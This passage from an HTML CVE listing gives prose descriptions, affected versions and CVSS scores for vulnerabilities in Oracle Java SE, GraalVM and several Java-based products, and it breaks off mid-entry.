		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 8u371, 8u371-perf, 11.0.19, 17.0.7, 20.0.1; Oracle GraalVM Enterprise Edition: 20.3.10, 21.3.6, 22.3.2; Oracle GraalVM for JDK: 17.0.7 and 20.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22045">CVE-2023-22045</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u371, 8u371-perf, 11.0.19, 17.0.7, 20.0.1; Oracle GraalVM Enterprise Edition: 20.3.10, 21.3.6, 22.3.2; Oracle GraalVM for JDK: 17.0.7 and 20.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22044">CVE-2023-22044</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u371-perf, 17.0.7, 20.0.1; Oracle GraalVM Enterprise Edition: 21.3.6, 22.3.2; Oracle GraalVM for JDK: 17.0.7 and 20.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22043">CVE-2023-22043</a></td>
		<td valign="top">Vulnerability in Oracle Java SE (component: JavaFX). The supported version that is affected is Oracle Java SE: 8u371. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.9 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22041">CVE-2023-22041</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u371-perf, 11.0.19, 17.0.7, 20.0.1; Oracle GraalVM Enterprise Edition: 20.3.10, 21.3.6, 22.3.2; Oracle GraalVM for JDK: 17.0.7 and 20.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with logon to the infrastructure where Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK executes to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22036">CVE-2023-22036</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK product of Oracle Java SE (component: Utility). Supported versions that are affected are Oracle Java SE: 11.0.19, 17.0.7, 20.0.1; Oracle GraalVM Enterprise Edition: 20.3.10, 21.3.6, 22.3.2; Oracle GraalVM for JDK: 17.0.7 and 20.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22025">CVE-2023-22025</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition, product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u381-perf, 17.0.8, 21; Oracle GraalVM for JDK: 17.0.8, 21; Oracle GraalVM Enterprise Edition: 21.3.7 and 22.3.3. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition,. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition, accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22006">CVE-2023-22006</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK product of Oracle Java SE (component: Networking). Supported versions that are affected are Oracle Java SE: 11.0.19, 17.0.7, 20.0.1; Oracle GraalVM Enterprise Edition: 20.3.10, 21.3.6, 22.3.2; Oracle GraalVM for JDK: 17.0.7 and 20.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.1 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21986">CVE-2023-21986</a></td>
		<td valign="top">Vulnerability in the Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Native Image). Supported versions that are affected are Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and 22.3.1. Easily exploitable vulnerability allows unauthenticated attacker with logon to the infrastructure where Oracle GraalVM Enterprise Edition executes to compromise Oracle GraalVM Enterprise Edition. While the vulnerability is in Oracle GraalVM Enterprise Edition, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle GraalVM Enterprise Edition accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Oracle GraalVM Enterprise Edition. CVSS 3.1 Base Score 5.7 (Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21968">CVE-2023-21968</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and 22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21967">CVE-2023-21967</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and 22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.9 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21954">CVE-2023-21954</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and 22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.9 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21939">CVE-2023-21939</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Swing). Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and 22.3.1. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21938">CVE-2023-21938</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.8, 21.3.4 and 22.3.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21937">CVE-2023-21937</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Networking). Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and 22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21934">CVE-2023-21934</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 19c and 21c. Difficult to exploit vulnerability allows low privileged attacker having User Account privilege with network access via TLS to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java VM accessible data as well as unauthorized access to critical data or complete access to all Java VM accessible data. CVSS 3.1 Base Score 6.8 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21930">CVE-2023-21930</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and 22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via TLS to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data as well as unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21849">CVE-2023-21849</a></td>
		<td valign="top">Vulnerability in the Oracle Applications DBA product of Oracle E-Business Suite (component: Java utils). Supported versions that are affected are 12.2.3-12.2.12. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Applications DBA. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Applications DBA accessible data. CVSS 3.1 Base Score 7.5 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21843">CVE-2023-21843</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Sound). Supported versions that are affected are Oracle Java SE: 8u351, 8u351-perf, 11.0.17, 17.0.5, 19.0.1; Oracle GraalVM Enterprise Edition: 20.3.8, 21.3.4 and 22.3.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21835">CVE-2023-21835</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Oracle Java SE: 11.0.17, 17.0.5, 19.0.1; Oracle GraalVM Enterprise Edition: 20.3.8, 21.3.4 and 22.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via DTLS to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-21830">CVE-2023-21830</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization). Supported versions that are affected are Oracle Java SE: 8u351, 8u351-perf; Oracle GraalVM Enterprise Edition: 20.3.8 and 21.3.4. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-20258">CVE-2023-20258</a></td>
		<td valign="top">A vulnerability in the web-based management interface of Cisco Prime Infrastructure could allow an authenticated, remote attacker to execute arbitrary commands on the underlying operating system. This vulnerability is due to improper processing of serialized Java objects by the affected application. An attacker could exploit this vulnerability by uploading a document containing malicious serialized Java objects to be processed by the affected application. A successful exploit could allow the attacker to cause the application to execute arbitrary commands.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-1656">CVE-2023-1656</a></td>
		<td valign="top">Cleartext Transmission of Sensitive Information vulnerability in ForgeRock Inc. OpenIDM and Java Remote Connector Server (RCS) LDAP Connector on Windows, MacOS, Linux allows Remote Services with Stolen Credentials.This issue affects OpenIDM and Java Remote Connector Server (RCS): from 1.5.20.9 through 1.5.20.13.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-1609">CVE-2023-1609</a></td>
		<td valign="top">A vulnerability was found in Zhong Bang CRMEB Java up to 1.3.4. It has been rated as problematic. This issue affects the function save of the file /api/admin/store/product/save. The manipulation leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-223739.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-1608">CVE-2023-1608</a></td>
		<td valign="top">A vulnerability was found in Zhong Bang CRMEB Java up to 1.3.4. It has been declared as critical. This vulnerability affects the function getAdminList of the file /api/admin/store/product/list. The manipulation of the argument cateId leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-223738 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-1165">CVE-2023-1165</a></td>
		<td valign="top">A vulnerability was found in Zhong Bang CRMEB Java 1.3.4. It has been classified as critical. This affects an unknown part of the file /api/admin/system/store/order/list. The manipulation of the argument keywords leads to sql injection. The exploit has been disclosed to the public and may be used. The identifier VDB-222261 was assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-0925">CVE-2023-0925</a></td>
		<td valign="top">Version 10.11 of webMethods OneData runs an embedded instance of Azul Zulu Java 11.0.15 which hosts a Java RMI registry (listening on TCP port 2099 by default) and two RMI interfaces (listening on a single, dynamically assigned TCP high port). Port 2099 serves as a Java Remote Method Invocation (RMI) registry which allows for remotely loading and processing data via RMI interfaces. An unauthenticated attacker with network connectivity to the RMI registry and RMI interface ports can abuse this functionality to instruct the webMethods OneData application to load a malicious serialized Java object as a parameter to one of the available Java methods presented by the RMI interface. Once deserialized on the vulnerable server, the malicious code runs as whichever operating system account is used to run the software, which in most cases is the local System account on Windows.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-0758">CVE-2023-0758</a></td>
		<td valign="top">A vulnerability was found in glorylion JFinalOA 1.0.2 and classified as critical. This issue affects some unknown processing of the file src/main/java/com/pointlion/mvc/common/model/SysOrg.java. The manipulation of the argument id leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-220469 was assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-0511">CVE-2023-0511</a></td>
		<td valign="top">Relative Path Traversal vulnerability in ForgeRock Access Management Java Policy Agent allows Authentication Bypass. This issue affects Access Management Java Policy Agent: all versions up to 5.10.1

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-0017">CVE-2023-0017</a></td>
		<td valign="top">An unauthenticated attacker in SAP NetWeaver AS for Java - version 7.50, due to improper access control, can attach to an open interface and make use of an open naming and directory API to access services which can be used to perform unauthorized operations affecting users and data on the current system. This could allow the attacker to have full read access to user data, make modifications to user data, and make services within the system unavailable.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4963">CVE-2022-4963</a></td>
		<td valign="top">A vulnerability was found in Folio Spring Module Core up to 1.1.5. It has been rated as critical. Affected by this issue is the function dropSchema of the file tenant/src/main/java/org/folio/spring/tenant/hibernate/HibernateSchemaService.java of the component Schema Name Handler. The manipulation leads to sql injection. Upgrading to version 2.0.0 is able to address this issue. The name of the patch is d374a5f77e6b58e36f0e0e4419be18b95edcd7ff. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-257516.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-4859">CVE-2022-4859</a></td>
		<td valign="top">A vulnerability, which was classified as problematic, has been found in Joget up to 7.0.33. This issue affects the function submitForm of the file wflow-core/src/main/java/org/joget/plugin/enterprise/UserProfileMenu.java of the component User Profile Menu. The manipulation of the argument firstName/lastName leads to cross site scripting. The attack may be initiated remotely. Upgrading to version 7.0.34 is able to address this issue. The patch is named 9a77f508a2bf8cf661d588f37a4cc29ecaea4fc8. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-217055.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-47966">CVE-2022-47966</a></td>
		<td valign="top">Multiple Zoho ManageEngine on-premise products, such as ServiceDesk Plus through 14003, allow remote code execution due to use of Apache Santuario xmlsec (aka XML Security for Java) 1.4.1, because the xmlsec XSLT features, by design in that version, make the application responsible for certain security protections, and the ManageEngine applications did not provide those protections. This affects Access Manager Plus before 4308, Active Directory 360 before 4310, ADAudit Plus before 7081, ADManager Plus before 7162, ADSelfService Plus before 6211, Analytics Plus before 5150, Application Control Plus before 10.1.2220.18, Asset Explorer before 6983, Browser Security Plus before 11.1.2238.6, Device Control Plus before 10.1.2220.18, Endpoint Central before 10.1.2228.11, Endpoint Central MSP before 10.1.2228.11, Endpoint DLP before 10.1.2137.6, Key Manager Plus before 6401, OS Deployer before 1.1.2243.1, PAM 360 before 5713, Password Manager Pro before 12124, Patch Manager Plus before 10.1.2220.18, Remote Access Plus before 10.1.2228.11, Remote Monitoring and Management (RMM) before 10.1.41. 